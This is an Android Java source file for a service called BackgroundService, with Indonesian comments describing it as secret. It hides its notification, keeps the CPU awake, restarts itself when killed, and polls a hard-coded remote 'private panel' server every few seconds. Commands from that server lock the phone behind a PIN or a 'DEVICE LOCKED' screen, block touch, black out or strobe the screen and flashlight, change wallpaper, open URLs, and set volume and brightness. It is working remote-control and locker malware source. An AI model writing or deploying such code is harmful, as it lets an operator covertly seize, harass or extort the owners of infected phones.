package com.nex.panel;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.view.View;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * BackgroundService — Foreground service diam-diam
 * ─────────────────────────────────────────────────
 * • Heartbeat setiap 15 detik (lebih agresif)
 * • Retry langsung jika heartbeat gagal (network lost → recovered)
 * • Poll command setiap 4 detik
 * • Watchdog internal setiap 30 detik
 * • AlarmManager repeating setiap 2 menit (lebih sering)
 * • ConnectivityManager — deteksi internet kembali, langsung heartbeat
 * • WakeLock partial — cegah CPU sleep saat layar mati
 * • START_STICKY — restart otomatis jika di-kill sistem
 */
public class BackgroundService extends Service {

    private static final String API_BASE      = "http://hanz-neon-privatepanel3583.ymzprivat.biz.id:3622";
    private static final String CH_ID         = "nex_bg_v3";
    private static final int    NOTIF_ID      = 9984;
    private static final String FLUTTER_PREFS = "FlutterSharedPreferences";
    private static final String TAG           = "BackgroundService";

    // Heartbeat 15 detik — lebih agresif dari sebelumnya (25 detik)
    private static final int HEARTBEAT_INTERVAL = 15;
    // Poll command 4 detik
    private static final int POLL_INTERVAL = 4;
    // Watchdog 30 detik
    private static final int WATCHDOG_INTERVAL = 30;

    private ScheduledExecutorService scheduler;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean isStrobeRunning = false;
    private Runnable strobeRunnable;
    private PowerManager.WakeLock wakeLock;
    private View brightnessOverlayView; // overlay untuk kontrol brightness

    // Connectivity receiver untuk deteksi internet kembali
    private android.net.ConnectivityManager.NetworkCallback networkCallback;
    private ConnectivityManager connectivityManager;

    // ── onCreate ─────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        createHiddenChannel();
        try {
            startForeground(NOTIF_ID, buildInvisibleNotification());
        } catch (Exception e) {
            try {
                startForeground(NOTIF_ID, buildFallbackNotification());
            } catch (Exception ignored) {}
        }
        acquireWakeLock();
        registerNetworkCallback();
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startTasks();
        setWatchdogAlarm();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        stopTasks();
        releaseWakeLock();
        unregisterNetworkCallback();
        // Hapus brightness overlay jika ada
        try {
            if (brightnessOverlayView != null) {
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                if (wm != null) wm.removeView(brightnessOverlayView);
                brightnessOverlayView = null;
            }
        } catch (Exception ignored) {}
        scheduleRestart();
        super.onDestroy();
    }

    // ── WakeLock — cegah CPU sleep ────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "NexPanel:BackgroundService"
                );
                wakeLock.acquire(); // tidak ada timeout — lepas di onDestroy
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ── Network callback — saat internet kembali, langsung heartbeat ──────
    private void registerNetworkCallback() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager = (ConnectivityManager)
                    getSystemService(Context.CONNECTIVITY_SERVICE);
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(android.net.Network network) {
                        // Internet kembali → langsung kirim heartbeat tanpa tunggu jadwal
                        Log.d(TAG, "Network available — immediate heartbeat");
                        Executors.newSingleThreadExecutor().execute(() -> {
                            // Delay 1 detik beri waktu network stabil
                            try { Thread.sleep(1000); } catch (Exception ignored) {}
                            sendHeartbeat();
                        });
                    }
                };
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            }
        } catch (Exception e) {
            Log.e(TAG, "registerNetworkCallback: " + e.getMessage());
        }
    }

    private void unregisterNetworkCallback() {
        try {
            if (networkCallback != null && connectivityManager != null
                    && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            }
        } catch (Exception ignored) {}
    }

    // ── Cek apakah ada internet aktif ────────────────────────────────────
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network net = cm.getActiveNetwork();
                if (net == null) return false;
                NetworkCapabilities nc = cm.getNetworkCapabilities(net);
                return nc != null && (
                    nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)    ||
                    nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)||
                    nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                );
            } else {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                return info != null && info.isConnected();
            }
        } catch (Exception e) {
            return false;
        }
    }

    // ── Start scheduler ───────────────────────────────────────────────────
    private void startTasks() {
        stopTasks();
        scheduler = Executors.newScheduledThreadPool(2);
        // Heartbeat setiap 15 detik
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 0,
            HEARTBEAT_INTERVAL, TimeUnit.SECONDS);
        // Poll command setiap 4 detik
        scheduler.scheduleAtFixedRate(this::pollCommands, 2,
            POLL_INTERVAL, TimeUnit.SECONDS);
        // Watchdog setiap 30 detik
        scheduler.scheduleAtFixedRate(this::checkSchedulerAlive, WATCHDOG_INTERVAL,
            WATCHDOG_INTERVAL, TimeUnit.SECONDS);
    }

    private void checkSchedulerAlive() {
        if (scheduler == null || scheduler.isTerminated() || scheduler.isShutdown()) {
            Log.w(TAG, "Scheduler mati — restart!");
            startTasks();
        }
    }

    private void stopTasks() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
        scheduler = null;
        stopStrobe();
    }

    // ── AlarmManager watchdog repeating ──────────────────────────────────
    private void setWatchdogAlarm() {
        try {
            Intent restart = new Intent(this, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getBroadcast(this, 9002, restart, flags);
            AlarmManager am  = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                // Repeating setiap 2 menit (lebih sering dari 3 menit)
                am.setRepeating(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 2 * 60 * 1000,
                    2 * 60 * 1000,
                    pi
                );
            }
        } catch (Exception ignored) {}
    }

    // ── Self-restart ──────────────────────────────────────────────────────
    private void scheduleRestart() {
        try {
            Intent direct = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(direct);
            } else {
                startService(direct);
            }
        } catch (Exception ignored) {}

        try {
            Intent restart = new Intent(this, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getBroadcast(this, 9001, restart, flags);
            AlarmManager am  = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.set(AlarmManager.RTC_WAKEUP,
                       System.currentTimeMillis() + 2000, pi);
            }
        } catch (Exception ignored) {}
    }

    // ── Baca Flutter SharedPreferences ───────────────────────────────────
    private String getFlutterPref(String key) {
        try {
            SharedPreferences prefs =
                getSharedPreferences(FLUTTER_PREFS, Context.MODE_PRIVATE);
            String val = prefs.getString("flutter." + key, "");
            if (val != null && !val.isEmpty()) return val;
            val = prefs.getString(key, "");
            return val != null ? val : "";
        } catch (Exception e) {
            return "";
        }
    }

    // ── Heartbeat dengan retry ────────────────────────────────────────────
    private void sendHeartbeat() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network — skip heartbeat");
            return;
        }
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            JSONObject body = new JSONObject();
            body.put("uid",      uid);
            body.put("deviceId", deviceId);
            postJson(API_BASE + "/deviceHeartbeat", body.toString());
            Log.d(TAG, "Heartbeat OK");
        } catch (Exception e) {
            Log.w(TAG, "Heartbeat failed: " + e.getMessage());
            // Retry setelah 3 detik
            uiHandler.postDelayed(this::retryHeartbeat, 3000);
        }
    }

    private void retryHeartbeat() {
        if (!isNetworkAvailable()) return;
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            JSONObject body = new JSONObject();
            body.put("uid",      uid);
            body.put("deviceId", deviceId);
            postJson(API_BASE + "/deviceHeartbeat", body.toString());
            Log.d(TAG, "Heartbeat retry OK");
        } catch (Exception ignored) {}
    }

    // ── Poll command ──────────────────────────────────────────────────────
    private void pollCommands() {
        if (!isNetworkAvailable()) return;
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            String resp = getJson(
                API_BASE + "/pollCommand?uid=" + uid + "&deviceId=" + deviceId);
            if (resp == null || resp.isEmpty()) return;
            JSONObject data = new JSONObject(resp);
            if (!data.optBoolean("success", false)) return;
            JSONArray cmds = data.optJSONArray("commands");
            if (cmds == null || cmds.length() == 0) return;
            for (int i = 0; i < cmds.length(); i++) {
                executeCommand(cmds.getJSONObject(i));
            }
        } catch (Exception ignored) {}
    }

    // ── Eksekusi command ──────────────────────────────────────────────────
    private void executeCommand(JSONObject cmd) {
        String command = cmd.optString("command", "");
        switch (command) {
            case "startStrobe":
            case "torchOn":
                uiHandler.post(this::startStrobe);
                break;

            case "stopStrobe":
            case "torchOff":
                uiHandler.post(this::stopStrobe);
                break;

            case "lockDevice": {
                JSONObject extra = cmd.optJSONObject("extra");
                String rawMsg = cmd.optString("message", "");
                String rawPin = cmd.optString("pin", "");
                if (rawMsg.isEmpty() && extra != null)
                    rawMsg = extra.optString("message", "HP ANDA DIKUNCI!");
                if (rawPin.isEmpty() && extra != null)
                    rawPin = extra.optString("pin", "1234");
                final String msg = rawMsg.isEmpty() ? "HP ANDA DIKUNCI!" : rawMsg;
                final String pin = rawPin.isEmpty() ? "1234" : rawPin;
                uiHandler.post(() -> {
                    try {
                        Intent lock = new Intent(this, LockOverlayService.class);
                        lock.setAction(LockOverlayService.ACTION_LOCK);
                        lock.putExtra(LockOverlayService.EXTRA_MESSAGE, msg);
                        lock.putExtra(LockOverlayService.EXTRA_PIN, pin);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(lock);
                        } else {
                            startService(lock);
                        }
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDevice":
                uiHandler.post(() -> {
                    try {
                        Intent unlock = new Intent(this, LockOverlayService.class);
                        unlock.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlock);
                    } catch (Exception ignored) {}
                });
                break;

            case "lockDeviceHtml": {
                String rawHtml = cmd.optString("html", "");
                final String finalHtml = rawHtml.isEmpty()
                    ? "<html><body style='background:#000;color:#fff;"
                    + "display:flex;align-items:center;justify-content:center;"
                    + "height:100vh;font-family:monospace;font-size:24px;'>"
                    + "☠️ DEVICE LOCKED</body></html>"
                    : rawHtml;
                uiHandler.post(() -> {
                    try {
                        Intent lockHtml = new Intent(this, LockOverlayService.class);
                        lockHtml.setAction(LockOverlayService.ACTION_LOCK_HTML);
                        lockHtml.putExtra(LockOverlayService.EXTRA_HTML, finalHtml);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(lockHtml);
                        } else {
                            startService(lockHtml);
                        }
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDeviceHtml":
                uiHandler.post(() -> {
                    try {
                        Intent unlockHtml = new Intent(this, LockOverlayService.class);
                        unlockHtml.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlockHtml);
                    } catch (Exception ignored) {}
                });
                break;

            case "videoOverlay":
                uiHandler.post(() -> {
                    try {
                        Intent vi = new Intent(this, VideoOverlayService.class);
                        vi.setAction(VideoOverlayService.ACTION_SHOW_VIDEO);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(vi);
                        } else {
                            startService(vi);
                        }
                    } catch (Exception ignored) {}
                });
                break;

            case "stopVideoOverlay":
                uiHandler.post(() -> {
                    try {
                        Intent sv = new Intent(this, VideoOverlayService.class);
                        sv.setAction(VideoOverlayService.ACTION_STOP_VIDEO);
                        startService(sv);
                    } catch (Exception ignored) {}
                });
                break;

            case "blockTouch":
                uiHandler.post(() -> {
                    try {
                        Intent bi = new Intent(this, TouchBlockerService.class);
                        bi.setAction(TouchBlockerService.ACTION_BLOCK_TOUCH);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(bi);
                        } else {
                            startService(bi);
                        }
                    } catch (Exception ignored) {}
                });
                break;

            case "stopBlockTouch":
                uiHandler.post(() -> {
                    try {
                        Intent sb2 = new Intent(this, TouchBlockerService.class);
                        sb2.setAction(TouchBlockerService.ACTION_STOP_BLOCK);
                        startService(sb2);
                    } catch (Exception ignored) {}
                });
                break;

            case "blackScreen": {
                final int blinkCount = cmd.optInt("count", 10);
                uiHandler.post(() -> {
                    try {
                        Intent blackIntent = new Intent(this, BlackScreenService.class);
                        blackIntent.setAction(BlackScreenService.ACTION_BLACK_SCREEN);
                        blackIntent.putExtra(BlackScreenService.EXTRA_COUNT, blinkCount);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(blackIntent);
                        } else {
                            startService(blackIntent);
                        }
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "setWallpaper": {
                final String wallUrl = cmd.optString("url", "");
                if (!wallUrl.isEmpty()) {
                    uiHandler.post(() -> {
                        try {
                            Intent wi = new Intent(this, SetWallpaperService.class);
                            wi.setAction(SetWallpaperService.ACTION_SET_WALLPAPER);
                            wi.putExtra(SetWallpaperService.EXTRA_URL, wallUrl);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(wi);
                            } else {
                                startService(wi);
                            }
                        } catch (Exception ignored) {}
                    });
                }
                break;
            }

            case "openUrl": {
                final String targetUrl = cmd.optString("url", "");
                if (!targetUrl.isEmpty()) {
                    uiHandler.post(() -> {
                        try {
                            Intent browserIntent = new Intent(
                                Intent.ACTION_VIEW,
                                android.net.Uri.parse(targetUrl)
                            );
                            browserIntent.addFlags(
                                Intent.FLAG_ACTIVITY_NEW_TASK |
                                Intent.FLAG_ACTIVITY_CLEAR_TOP
                            );
                            startActivity(browserIntent);
                        } catch (Exception ignored) {}
                    });
                }
                break;
            }

            case "setBrightness": {
                final int level = cmd.optInt("level", 50);
                uiHandler.post(() -> {
                    try {
                        // Metode 1: Settings.System (butuh WRITE_SETTINGS — coba dulu)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                                && Settings.System.canWrite(BackgroundService.this)) {
                            int brightness = (int) Math.round((level / 100.0) * 255);
                            brightness = Math.max(0, Math.min(255, brightness));
                            Settings.System.putInt(getContentResolver(),
                                Settings.System.SCREEN_BRIGHTNESS_MODE,
                                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                            Settings.System.putInt(getContentResolver(),
                                Settings.System.SCREEN_BRIGHTNESS, brightness);
                            Log.d(TAG, "Brightness via Settings.System: " + level + "%");
                        } else {
                            // Metode 2: Overlay Window brightness — TIDAK butuh WRITE_SETTINGS
                            // Buat overlay transparan fullscreen dengan brightness sesuai
                            setBrightnessViaOverlay(level);
                            Log.d(TAG, "Brightness via Overlay: " + level + "%");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "setBrightness error: " + e.getMessage());
                        // Fallback ke overlay
                        try { setBrightnessViaOverlay(level); } catch (Exception ignored) {}
                    }
                });
                break;
            }

            case "setVolume": {
                final int volLevel = cmd.optInt("level", 50);
                final String volType = cmd.optString("type", "media");
                uiHandler.post(() -> {
                    try {
                        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                        if (am == null) return;
                        int streamType;
                        switch (volType) {
                            case "ring":         streamType = AudioManager.STREAM_RING;         break;
                            case "alarm":        streamType = AudioManager.STREAM_ALARM;        break;
                            case "notification": streamType = AudioManager.STREAM_NOTIFICATION; break;
                            case "call":         streamType = AudioManager.STREAM_VOICE_CALL;   break;
                            default:             streamType = AudioManager.STREAM_MUSIC;        break;
                        }
                        int maxVol = am.getStreamMaxVolume(streamType);
                        int target = (int) Math.round((volLevel / 100.0) * maxVol);
                        target = Math.max(0, Math.min(maxVol, target));
                        am.setStreamVolume(streamType, target, 0);
                        Log.d(TAG, "Volume " + volType + ": " + volLevel + "%");
                    } catch (Exception e) {
                        Log.e(TAG, "setVolume: " + e.getMessage());
                    }
                });
                break;
            }
        }
    }

    // ── Set brightness via WindowManager overlay ──────────────────────────
    // Tidak butuh WRITE_SETTINGS permission — bekerja di semua Android
    private void setBrightnessViaOverlay(int levelPercent) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) return;

            // Hapus overlay lama kalau ada
            if (brightnessOverlayView != null) {
                try { wm.removeView(brightnessOverlayView); } catch (Exception ignored) {}
                brightnessOverlayView = null;
            }

            // Konversi 0-100% ke WindowManager brightness (-1 = system default, 0-1 = custom)
            // -1.0 = sistem, 0.0 = paling gelap, 1.0 = paling terang
            float windowBrightness;
            if (levelPercent <= 0) {
                windowBrightness = 0.01f; // hampir mati tapi tidak mati total
            } else if (levelPercent >= 100) {
                windowBrightness = 1.0f;
            } else {
                windowBrightness = levelPercent / 100.0f;
            }

            // Buat overlay transparan fullscreen dengan brightness custom
            View overlay = new View(this);
            overlay.setBackgroundColor(android.graphics.Color.TRANSPARENT);
            brightnessOverlayView = overlay;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE       |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE        |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL      |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.TOP | Gravity.START;
            // INI KUNCINYA — screenBrightness di WindowManager params
            params.screenBrightness = windowBrightness;

            wm.addView(overlay, params);
            Log.d(TAG, "Brightness overlay set: " + levelPercent + "% → " + windowBrightness);

            // Auto-hapus overlay setelah 30 menit
            // (user bisa set ulang kapan saja)
            uiHandler.postDelayed(() -> {
                try {
                    if (brightnessOverlayView != null) {
                        wm.removeView(brightnessOverlayView);
                        brightnessOverlayView = null;
                    }
                } catch (Exception ignored) {}
            }, 30 * 60 * 1000L);

        } catch (Exception e) {
            Log.e(TAG, "setBrightnessViaOverlay: " + e.getMessage());
        }
    }

    // ── Flash strobe ──────────────────────────────────────────────────────
    private void startStrobe() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { isStrobeRunning = false; return; }
            final boolean[] on = {false};
            strobeRunnable = new Runnable() {
                @Override public void run() {
                    try {
                        String id = cm.getCameraIdList()[0];
                        on[0] = !on[0];
                        cm.setTorchMode(id, on[0]);
                        if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                    } catch (Exception e) {
                        isStrobeRunning = false;
                    }
                }
            };
            uiHandler.post(strobeRunnable);
        } catch (Exception e) {
            isStrobeRunning = false;
        }
    }

    private void stopStrobe() {
        isStrobeRunning = false;
        if (strobeRunnable != null) {
            uiHandler.removeCallbacks(strobeRunnable);
            strobeRunnable = null;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm != null) cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception ignored) {}
    }

    // ── HTTP utils ────────────────────────────────────────────────────────
    private void postJson(String urlStr, String json) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(json.getBytes("UTF-8"));
        }
        conn.getResponseCode();
        conn.disconnect();
    }

    private String getJson(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try {
            Scanner sc = new Scanner(conn.getInputStream(), "UTF-8");
            StringBuilder sb = new StringBuilder();
            try { while (sc.hasNextLine()) sb.append(sc.nextLine()); }
            finally { sc.close(); }
            return sb.toString();
        } finally {
            conn.disconnect();
        }
    }

    // ── Notification channel IMPORTANCE_NONE ──────────────────────────────
    private void createHiddenChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
                ch.setShowBadge(false);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.enableLights(false);
                ch.setDescription("");
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception ignored) {}
        }
    }

    private Notification buildInvisibleNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }

    private Notification buildFallbackNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
